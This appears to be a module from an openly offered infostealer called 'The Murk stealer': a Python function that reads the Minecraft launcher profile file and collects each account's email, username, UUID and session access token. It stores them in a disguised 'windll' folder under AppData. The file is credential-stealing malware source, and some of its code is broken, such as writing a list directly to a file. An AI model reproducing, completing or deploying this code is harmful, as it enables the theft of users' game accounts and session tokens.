#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import json
import os
from urllib.request import Request, urlopen

def uuid_dashed(uuid):
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

def Minecraft():
    try:
        auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]# path to minecraft
        logs = []
        for x in auth_db:
            try:
                email = auth_db[x].get("username")
                uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
                """
                decrypt minecraft 
                """
                log = {
                    "fields": [
                        {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                        {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
                        {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                        {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                        ]
                }
                logs.append(log)
                pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
                try:
                    os.makedirs(rf'{pathf}\windll\Minecraft')
                    with open(rf'{pathf}\windll\Minecraft\session.txt',"w") as file:#wrire logs
                        file.write(logs)
                except Exception as e:
                    print(e)
            except:
                pass
    except Exception as e:
        print(e)